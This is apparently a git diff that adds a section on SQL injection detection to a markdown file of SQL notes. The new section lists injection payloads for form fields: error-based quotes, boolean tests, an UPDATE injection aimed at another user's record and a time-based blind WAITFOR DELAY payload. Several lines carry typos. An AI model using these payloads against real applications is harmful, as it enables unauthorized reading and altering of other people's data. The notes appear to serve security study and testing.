@@ -42,3 +42,30 @@ Delete (DELETE):
     DELETE FROM customers WHERE id = 1
 ```
 
+
+## SQL Injection Detection and confirmation
+
+
+In Create Operation
+
+```SQL
+  # Error Based PAYLOADS [;,--,',",#]
+  name=hacker'
+
+  # Condition Based Detection
+  name=hacker'and 1=1-- (Sucess Execution)
+  select name from users where id=1 and 1=1;--;
+
+  name=hacker'and 1=2-- (Failed  Execution)
+  select name from users where id=1 and 1=2;--;
+
+
+  email=newemial@gmail.com' WHERE id= {not_yours};--
+  UPDATE customers SET email = 'newemail@example.com' WHERE id = -1 ;--
+
+  # Blind Based PAYLOADS
+  email=test@emial.com' WAITFOR DELAY '0:0:10'--
+
+  
+```
+
